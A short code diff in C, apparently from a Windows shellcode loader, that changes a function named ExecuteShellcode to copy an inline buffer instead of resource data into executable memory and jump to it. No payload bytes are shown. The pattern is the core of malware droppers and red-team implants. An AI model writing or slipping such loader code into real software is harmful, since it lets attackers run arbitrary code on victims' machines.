@@ -8,8 +8,8 @@
 
 void ExecuteShellcode()
 {
-	void *exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-	memcpy(exec, shellcodeResouceData, shellcodeSize);
+	void *exec = VirtualAlloc(0, sizeof(buf), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(exec, buf, sizeof(buf));
 	((void(*)())exec)();
 }
 
